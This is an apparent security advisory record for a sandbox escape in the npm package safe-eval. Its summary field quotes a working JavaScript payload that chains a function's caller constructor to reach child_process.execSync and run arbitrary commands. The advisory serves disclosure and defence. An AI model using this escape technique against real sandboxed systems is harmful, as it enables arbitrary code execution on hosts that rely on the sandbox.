advisory_id: GHSA-9pcf-h8q9-63f6
datasource_id: github_osv_importer_v2/GHSA-9pcf-h8q9-63f6
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-9pcf-h8q9-63f6/GHSA-9pcf-h8q9-63f6.json
aliases: []
summary: "Sandbox Breakout / Arbitrary Code Execution in safe-eval\nAll versions of `safe-eval`\
  \ are vulnerable to Sandbox Escape leading to Remote Code Execution. A payload chaining a\
  \ function's callee and caller constructors can escape the sandbox and execute arbitrary code.\
  \  \n\nFor example, the payload \n```\n((() => { \nconst targetKey = Object.keys(this)[0];\
  \ \nObject.defineProperty(this, targetKey, { \nget: function() { \nreturn arguments.callee.caller.constructor(\
  \ \n\"return global.process.mainModule.require('child_process').execSync('pwd').toString()\"\
  \ \n)(); \n} \n}); \n})();```\nmay be used to print the `pwd` to the console.\n\n\n## Recommendation\n\
  \nNo fix is currently available. Consider using an alternative package until a fix is made\
  \ available."
impacted_packages:
  - purl: pkg:npm/safe-eval
    affected_versions: vers:npm/>=0.0.0
    fixed_versions:
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses: []
references:
  - url: https://www.npmjs.com/advisories/1033
    reference_type:
    reference_id:
